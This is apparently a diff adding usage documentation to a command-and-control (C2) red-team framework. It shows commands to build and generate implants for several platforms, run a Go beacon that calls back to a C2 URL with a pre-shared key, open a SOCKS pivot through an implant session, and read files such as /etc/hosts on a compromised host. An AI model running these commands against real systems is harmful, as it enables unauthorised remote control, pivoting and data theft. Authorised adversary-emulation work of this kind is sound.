@@ -159,9 +159,50 @@ Server path: `/ws/v1/beacon` (or WS profile path). Client needs `websocket-clien
 
 ```bash
 sc5 implants families
+sc5 implants build --os linux --arch amd64 C2_HOST 8443
 sc5 implants generate dns_beacon <HOST> 5353 --raw
 sc5 implants generate linux_memfd <HOST> 8443 --raw
 sc5 implants generate bof <HOST> 8443 --platform windows --raw
+```
+
+### Native sc5beacon (preferred)
+
+See [agents/sc5beacon/README.md](../agents/sc5beacon/README.md).
+
+```bash
+cd agents/sc5beacon && go build -o sc5beacon .
+export SC5_URL="https://C2:8443/api/v1/implant/beacon"
+export SC5_PSK="$(cat data/implant_psk.txt)"   # from teamserver
+./sc5beacon
+```
+
+Server must have `SQUIDC5_IMPLANT_REQUIRE_AUTH=true` (default) and matching PSK.
+
+### SOCKS pivot
+
+```bash
+# Implant reverse-dial (default): needs live beacon session
+curl -sk -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+  -d '{"session_id":"ses_...","mode":"implant","listen_host":"127.0.0.1"}' \
+  https://C2:8443/api/v1/pivot/socks
+# Point proxy tool at returned listen_port; implant handles socks:connect tasks
+
+# Direct mode: C2 dials targets itself (lab)
+# mode=direct
+```
+
+### File ops
+
+```bash
+# POST /api/v1/files/op
+# {"session_id":"...","op":"list","path":"/tmp"}
+# {"session_id":"...","op":"read","path":"/etc/hosts","offset":0,"length":1024}
+```
+
+### Audit integrity
+
+```bash
+sc5 audit-verify --limit 500
 ```
 
 ## Teams / collab
